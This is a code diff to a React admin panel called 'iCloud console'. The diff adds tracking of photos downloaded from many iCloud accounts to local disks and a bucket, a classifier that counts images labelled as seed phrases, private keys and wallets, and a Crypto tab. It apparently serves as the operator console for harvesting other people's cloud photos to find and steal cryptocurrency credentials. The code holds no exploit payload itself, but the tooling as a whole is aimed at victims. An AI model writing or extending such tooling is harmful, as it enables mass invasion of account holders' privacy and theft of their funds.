@@ -1,10 +1,21 @@
 import { useEffect, useMemo, useState } from "react";
 import { useAdminSocket } from "./useAdminSocket";
-import { adminLogin, adminLogout, adminSession, countryFlag, timeAgo } from "./api.js";
+import {
+  adminLogin,
+  adminLogout,
+  adminSession,
+  bytes,
+  countryFlag,
+  getClassify,
+  getStorage,
+  timeAgo,
+} from "./api.js";
 import { AccountBadge, Badge, StatusDot } from "./ui.jsx";
 import { accountBadges } from "./badges.js";
 import AccountView from "./AccountView.jsx";
 import LibraryTab from "./LibraryTab.jsx";
+import CryptoTab from "./CryptoTab.jsx";
+import ServicesTab from "./ServicesTab.jsx";
 
 /* ------------------------------------------------------------------ login */
 
@@ -45,8 +56,7 @@ function Login({ onConnect, notice }) {
           <h1 className="text-[20px] font-semibold tracking-[-0.3px]">iCloud console</h1>
         </div>
         <p className="mt-2 text-[13px] leading-5 text-[#6e6e73]">
-          The password is checked by the server. This browser stays signed in for 7 days; Disconnect
-          clears it.
+          The password is checked by the server. This browser stays signed in for 7 days.
         </p>
         <label className="mt-6 block text-[11px] font-medium uppercase tracking-[0.06em] text-[#6e6e73]">
           Password
@@ -66,7 +76,7 @@ function Login({ onConnect, notice }) {
           disabled={busy || !password}
           className="mt-5 h-11 w-full rounded-[10px] bg-[#0071e3] text-[14px] font-medium text-white disabled:opacity-50"
         >
-          {busy ? "Signing in…" : "Open panel"}
+          {busy ? "Signing in…" : "Sign in"}
         </button>
       </form>
     </div>
@@ -75,7 +85,9 @@ function Login({ onConnect, notice }) {
 
 /* ------------------------------------------------------------------- shell */
 
-function AccountRow({ account, active, onClick, now }) {
+function AccountRow({ account, active, onClick, now, local }) {
+  const cloud = Number(account.counts?.images ?? 0);
+  const onDisk = Number(local?.photos ?? 0) + Number(local?.videos ?? 0);
   const badges = accountBadges(account, now);
   return (
     <button
@@ -109,6 +121,21 @@ function AccountRow({ account, active, onClick, now }) {
           ) : null}
           {account.identity?.name ? (
             <span className="truncate text-[10px] text-[#6e6e73]">{account.identity.name}</span>
+          ) : null}
+          {cloud > 0 ? (
+            <span className="rounded-full bg-[#f2f2f7] px-1.5 py-0.5 text-[9px] font-medium text-[#424245]">
+              cloud {cloud.toLocaleString()}
+            </span>
+          ) : null}
+          {onDisk > 0 ? (
+            <span className="rounded-full bg-[#eef8f1] px-1.5 py-0.5 text-[9px] font-medium text-[#1d7a3a]">
+              local {onDisk.toLocaleString()}
+            </span>
+          ) : null}
+          {Number(local?.bucket ?? 0) > 0 ? (
+            <span className="rounded-full bg-[#f0f0f5] px-1.5 py-0.5 text-[9px] font-medium text-[#5b5b63]">
+              S4 {Number(local.bucket).toLocaleString()}
+            </span>
           ) : null}
         </span>
       </span>
@@ -211,6 +238,7 @@ function Submissions({ admin }) {
 }
 
 function Panel({ admin, onLogout, warnings = [] }) {
+  const [warningsOpen, setWarningsOpen] = useState(true);
   const {
     state,
     loadAccounts,
@@ -237,6 +265,8 @@ function Panel({ admin, onLogout, warnings = [] }) {
   const [importEmail, setImportEmail] = useState("");
   const [importBusy, setImportBusy] = useState(false);
   const [importError, setImportError] = useState("");
+  const [storage, setStorage] = useState(null);
+  const [classify, setClassify] = useState(null);
 
   useEffect(() => {
     if (state.status !== "online") return undefined;
@@ -246,6 +276,42 @@ function Panel({ admin, onLogout, warnings = [] }) {
     );
     return () => clearTimeout(timer);
   }, [query, filter, loadAccounts, state.status]);
+
+  // Local vs cloud: refreshed once a minute while the panel is open.
+  useEffect(() => {
+    if (state.status !== "online") return undefined;
+    let alive = true;
+    const load = () =>
+      getStorage()
+        .then((data) => {
+          if (alive && data?.ok) setStorage(data);
+        })
+        .catch(() => {});
+    load();
+    const timer = setInterval(load, 60_000);
+    return () => {
+      alive = false;
+      clearInterval(timer);
+    };
+  }, [state.status]);
+
+  // Photo labels: live while the classifier is running.
+  useEffect(() => {
+    if (state.status !== "online") return undefined;
+    let alive = true;
+    const load = () =>
+      getClassify()
+        .then((data) => {
+          if (alive && data?.ok) setClassify(data);
+        })
+        .catch(() => {});
+    load();
+    const timer = setInterval(load, 10_000);
+    return () => {
+      alive = false;
+      clearInterval(timer);
+    };
+  }, [state.status]);
 
   // Expire NEW / NEW FILES / NEW SEEDS labels without a manual refresh.
   useEffect(() => {
@@ -279,13 +345,21 @@ function Panel({ admin, onLogout, warnings = [] }) {
 
   return (
     <div className="flex h-screen flex-col overflow-hidden bg-[#f5f5f7] text-[#1d1d1f]">
-      {warnings.length ? (
+      {warnings.length && warningsOpen ? (
         <div className="flex flex-wrap items-center gap-x-3 gap-y-1 border-b border-[#f3dfa8] bg-[#fff8e6] px-4 py-2 text-[11px] text-[#8a6100]">
           <b className="uppercase tracking-[0.05em]">Security</b>
           {warnings.map((warning) => (
             <span key={warning}>{warning}</span>
           ))}
           <span className="text-[#a07b16]">→ set them in .env and restart</span>
+          <button
+            type="button"
+            onClick={() => setWarningsOpen(false)}
+            className="ml-auto rounded-full px-2 py-0.5 text-[11px] text-[#8a6100] hover:bg-[#f7e7bb]"
+            aria-label="Dismiss security warnings"
+          >
+            ×
+          </button>
         </div>
       ) : null}
       <div className="flex min-h-0 flex-1 overflow-hidden">
@@ -311,7 +385,7 @@ function Panel({ admin, onLogout, warnings = [] }) {
               {state.status}
             </span>
           </div>
-          <div className="mt-3 flex gap-1">
+          <div className="mt-3 flex flex-wrap gap-1">
             <button
               type="button"
               onClick={() => setView("accounts")}
@@ -332,6 +406,15 @@ function Panel({ admin, onLogout, warnings = [] }) {
             </button>
             <button
               type="button"
+              onClick={() => setView("crypto")}
+              className={`h-7 rounded-full px-3 text-[11px] font-medium ${
+                view === "crypto" ? "bg-[#1d1d1f] text-white" : "border border-[#d2d2d7] text-[#424245]"
+              }`}
+            >
+              ₿ Crypto
+            </button>
+            <button
+              type="button"
               onClick={() => setView("submissions")}
               className={`h-7 rounded-full px-3 text-[11px] font-medium ${
                 view === "submissions" ? "bg-[#1d1d1f] text-white" : "border border-[#d2d2d7] text-[#424245]"
@@ -341,15 +424,18 @@ function Panel({ admin, onLogout, warnings = [] }) {
             </button>
             <button
               type="button"
-              onClick={logout}
-              className="ml-auto h-7 rounded-full border border-[#d2d2d7] px-3 text-[11px] text-[#424245] hover:bg-[#fafafa]"
+              onClick={() => setView("services")}
+              className={`h-7 rounded-full px-3 text-[11px] font-medium ${
+                view === "services" ? "bg-[#1d1d1f] text-white" : "border border-[#d2d2d7] text-[#424245]"
+              }`}
             >
-              Disconnect
+              Services
             </button>
+            <span className="ml-auto" />
           </div>
         </header>
 
-        {view === "accounts" ? (
+        {view === "accounts" || view === "services" ? (
           <>
             <div className="border-b border-[#e5e5ea] px-3 py-2">
               <input
@@ -434,11 +520,125 @@ function Panel({ admin, onLogout, warnings = [] }) {
               </div>
             </div>
 
+            {storage ? (
+              <div className="border-b border-[#e5e5ea] bg-[#fafafa] px-3 py-2">
+                {(() => {
+                  const totals = storage.totals || {};
+                  const done = Number(totals.donePct || 0);
+                  const pending = Number(totals.pending || 0);
+                  return (
+                    <>
+                      <div className="flex items-center justify-between text-[10px] font-medium uppercase tracking-[0.05em] text-[#6e6e73]">
+                        <span>Download progress</span>
+                        <span className="normal-case tracking-normal text-[#1d1d1f]">
+                          {done}% done
+                        </span>
+                      </div>
+                      <div className="mt-1 h-1.5 overflow-hidden rounded-full bg-[#e5e5ea]">
+                        <div className="h-1.5 rounded-full bg-[#30a14e]" style={{ width: `${done}%` }} />
+                      </div>
+                      <div className="mt-1 flex items-center justify-between text-[10px]">
+                        <span className="text-[#1d7a3a]">
+                          ✓ {Number(totals.downloaded || 0).toLocaleString()} downloaded
+                        </span>
+                        <span className="text-[#8a6100]">
+                          {pending.toLocaleString()} left ({totals.pendingPct || 0}%)
+                        </span>
+                      </div>
+                      <div className="text-[9px] text-[#9a9aa0]">
+                        {Number(totals.cloud || 0).toLocaleString()} images in iCloud ·{" "}
+                        {Number(totals.local || 0).toLocaleString()} on disk ·{" "}
+                        {Number(totals.bucket || 0).toLocaleString()} on S4
+                      </div>
+                    </>
+                  );
+                })()}
+                {classify?.progress ? (
+                  <div className="mt-2 border-t border-[#e5e5ea] pt-2">
+                    {(() => {
+                      const p = classify.progress;
+                      const done = Number(p.done || 0);
+                      const total = Number(p.total || 0);
+                      const pct = total ? Math.min(100, Math.round((done / total) * 100)) : 0;
+                      const left = Math.max(0, total - done);
+                      const eta = Number(p.etaSeconds || 0);
+                      const labels = classify.labels || {};
+                      const top = ["seed", "seed-candidate", "privatekey", "wallet"]
+                        .filter((id) => labels[id])
+                        .map((id) => `${labels[id]} ${id}`)
+                        .join(" · ");
+                      return (
+                        <>
+                          <div className="flex items-center justify-between text-[10px] font-medium uppercase tracking-[0.05em] text-[#6e6e73]">
+                            <span>Classify progress</span>
+                            <span className="normal-case tracking-normal text-[#1d1d1f]">
+                              {pct}% · {p.rate || 0}/s
+                            </span>
+                          </div>
+                          <div className="mt-1 h-1.5 overflow-hidden rounded-full bg-[#e5e5ea]">
+                            <div
+                              className="h-1.5 rounded-full bg-[#0071e3]"
+                              style={{ width: `${pct}%` }}
+                            />
+                          </div>
+                          <div className="mt-1 flex items-center justify-between text-[10px]">
+                            <span className="text-[#1d1d1f]">
+                              {done.toLocaleString()} / {total.toLocaleString()} labelled
+                            </span>
+                            <span className="text-[#6e6e73]">
+                              {p.phase === "finished"
+                                ? "finished"
+                                : `${left.toLocaleString()} left · ${Math.floor(eta / 60)}m${String(eta % 60).padStart(2, "0")}s`}
+                            </span>
+                          </div>
+                          {top ? (
+                            <div className="text-[9px] text-[#9a9aa0]">
+                              {top} · {Number(classify.classified || 0).toLocaleString()} with a label
+                            </div>
+                          ) : null}
+                        </>
+                      );
+                    })()}
+                  </div>
+                ) : null}
+                {storage.disks.map((disk) => {
+                  const pct = disk.total ? Math.min(100, Math.round((disk.used / disk.total) * 100)) : 0;
+                  const slot = (storage.perDisk || {})[disk.label];
+                  return (
+                    <div key={disk.label} className="mt-1.5">
+                      <div className="flex items-center justify-between text-[10px] text-[#6e6e73]">
+                        <span className="capitalize">
+                          {disk.label}
+                          {slot ? (
+                            <span className="ml-1.5 text-[#1d1d1f]">
+                              {Number(slot.photos + slot.videos).toLocaleString()} img
+                              {" · "}
+                              {bytes(slot.bytes)}
+                            </span>
+                          ) : null}
+                        </span>
+                        <span>
+                          {bytes(disk.free)} free of {bytes(disk.total)}
+                        </span>
+                      </div>
+                      <div className="mt-0.5 h-1 overflow-hidden rounded-full bg-[#e5e5ea]">
+                        <div
+                          className={`h-1 rounded-full ${pct > 90 ? "bg-[#d70015]" : pct > 75 ? "bg-[#ff9f0a]" : "bg-[#0071e3]"}`}
+                          style={{ width: `${pct}%` }}
+                        />
+                      </div>
+                    </div>
+                  );
+                })}
+              </div>
+            ) : null}
+
             <div className="min-h-0 flex-1 overflow-y-auto">
               {accounts.map((account) => (
                 <AccountRow
                   key={account.id}
                   account={account}
+                  local={storage?.accounts?.[account.id]}
                   now={now}
                   active={state.selectedAccount?.id === account.id}
                   onClick={() => {
@@ -586,8 +786,12 @@ function Panel({ admin, onLogout, warnings = [] }) {
       ) : null}
 
       <main className={`${showList ? "hidden" : "flex"} min-w-0 flex-1 flex-col lg:flex`}>
-        {view === "submissions" ? (
+        {view === "services" ? (
+          <ServicesTab admin={admin} />
+        ) : view === "submissions" ? (
           <Submissions admin={admin} />
+        ) : view === "crypto" ? (
+          <CryptoTab />
         ) : view === "library" ? (
           <LibraryTab admin={admin} />
         ) : state.selectedAccount ? (
@@ -595,6 +799,7 @@ function Panel({ admin, onLogout, warnings = [] }) {
             key={state.selectedAccount.id}
             account={state.selectedAccount}
             jobs={state.accountJobs}
+            exportEnabled={state.exportEnabled}
             now={now}
             onPing={pingAccount}
             onExport={exportAccount}
@@ -663,6 +868,19 @@ export default function Admin() {
           admin.connect();
         }}
       />
+    );
+  }
+
+  // The cookie can be valid while the socket still rejects it (stale password
+  // or secret).  Do not show the panel until the admin namespace is online.
+  if (admin.state.status !== "online") {
+    return (
+      <div className="flex min-h-screen flex-col items-center justify-center gap-2 bg-[#f5f5f7] px-6 text-center">
+        <span className="text-[13px] text-[#6e6e73]">
+          {admin.state.status === "error" ? "Console unavailable — retrying…" : "Connecting to the console…"}
+        </span>
+        {admin.state.error ? <span className="text-[11px] text-[#9a9aa0]">{admin.state.error}</span> : null}
+      </div>
     );
   }
 
